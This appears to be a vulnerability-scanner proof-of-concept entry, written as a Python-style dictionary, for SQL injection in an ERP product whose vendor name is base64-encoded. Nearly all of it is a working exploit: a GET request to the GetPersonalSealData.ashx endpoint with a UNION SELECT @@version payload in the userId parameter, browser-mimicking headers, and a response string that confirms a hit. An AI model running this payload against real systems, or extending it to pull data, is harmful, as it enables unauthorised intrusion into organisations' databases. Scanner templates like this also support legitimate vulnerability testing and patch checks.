{
        'name': '5pm66YKm5Zu96ZmF ERP SQL注入漏洞',
        'poc': [{
                'requests':{
                'method': 'get',
                'payload': '/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--',
                'headers': {
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1'
                },
                'dnslog': False,
                'sqltime': False,
                },
                'response': {
                    'status_code': 200,
                    'text': 'SealData":"'
                }
            }
        ]
    }